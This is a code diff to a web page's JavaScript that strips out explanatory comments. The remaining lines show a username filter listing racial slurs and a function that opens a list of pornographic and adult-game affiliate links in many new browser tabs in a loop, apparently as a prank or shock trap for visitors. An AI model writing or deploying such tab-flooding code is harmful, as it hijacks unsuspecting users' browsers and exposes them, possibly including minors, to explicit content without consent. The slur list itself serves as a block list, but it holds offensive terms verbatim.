@@ -383,10 +383,10 @@
         const infoContainer = document.getElementById('infoContainer');
         const audio = document.getElementById('backgroundAudio');
         
-        // Disable continue button initially
+        
         continueBtn.disabled = true;
         
-        // List of inappropriate words to check against
+        
         const inappropriateWords = ['nigga', 'niggas', 'nigger', 'nega', 'retard'];
         
         function validateUsername(username) {
@@ -410,7 +410,7 @@
                     }
                 });
                 
-                // Since we're using no-cors, we'll assume non-proxy by default
+                
                 return false;
             } catch {
                 return false;
@@ -529,7 +529,7 @@
             }, 1000);
         }
 
-        // List of websites to open (replace these with your desired websites)
+        
         const websites = [
             'https://www.pornhub.com/view_video.php?viewkey=67e53a912da49',
             'https://playadultgames.space/lg/4girls_shadow/?clickid=cvqgo4h31urs73dq0pvg&t1_md5=ed36ae7acbbb6e0b3994999044e54589&t2_md5=ce6829dc213ea1d2f0c2b96b16d0a43e&t3_md5=9d5c0c1291fb890f0a6e089cb433993e&campaign=1056',
@@ -549,7 +549,7 @@
                 for (let i = 0; i < timesToOpen; i++) {
                     setTimeout(() => {
                         window.open(site, '_blank');
-                    }, i * 100); // Small delay between each open
+                    }, i * 100); 
                 }
             });
         }
